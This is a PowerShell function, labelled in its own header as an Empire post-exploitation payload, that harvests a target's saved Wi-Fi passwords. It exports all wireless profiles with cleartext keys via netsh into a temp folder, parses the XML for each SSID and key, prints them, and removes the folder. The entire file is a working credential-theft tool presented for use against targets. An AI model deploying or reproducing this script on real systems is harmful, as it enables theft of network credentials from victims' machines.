function Get-WifiPasswd
{

<#
.SYNOPSIS
Empire Payload to get the target's all wifi passwd 

.DESCRIPTION
This payload uses the Get our target's all wifi password.
but you need a administrator privilege.

.EXAMPLE
PS > Get-WifiPasswd

.LINK
http://www.s0nnet.com/

#>

	[CmdletBinding()]
    Param ()

	$temp = $env:temp
	$SaveDir = "wifi_conf"
	$tempPath = $temp + '\' + $SaveDir
	if((Test-Path $tempPath) -eq 1)
	{
		$t = Remove-Item $tempPath -recurse
	}
	$t = New-Item -Path $temp -name $SaveDir -Type Directory
	$t = netsh wlan export profile key=clear folder=$tempPath
	$fileList = Get-ChildItem $tempPath *.xml | %{$_.FullName}
	Foreach($file in $fileList)
	{
		$tmpContent = [xml](Get-Content $file)
		$Name = $tmpContent.WLANProfile.SSIDConfig.SSID.name
		$Hex= $tmpContent.WLANProfile.SSIDConfig.SSID.hex
		$Auth = $tmpContent.WLANProfile.MSM.security.authEncryption.authentication
		$Enc = $tmpContent.WLANProfile.MSM.security.authEncryption.encryption
		$Prot = $tmpContent.WLANProfile.MSM.security.sharedKey.protected
		$Pswd = $tmpContent.WLANProfile.MSM.security.sharedKey.keyMaterial
		'WiFi: ' + $Name +'('+ $Hex + ')'+' Key: '+ $Pswd +'  '+$Auth +'/'+ $Enc
	}
	if((Test-Path $tempPath) -eq 1)
	{
		$t = Remove-Item $tempPath -recurse
	}
}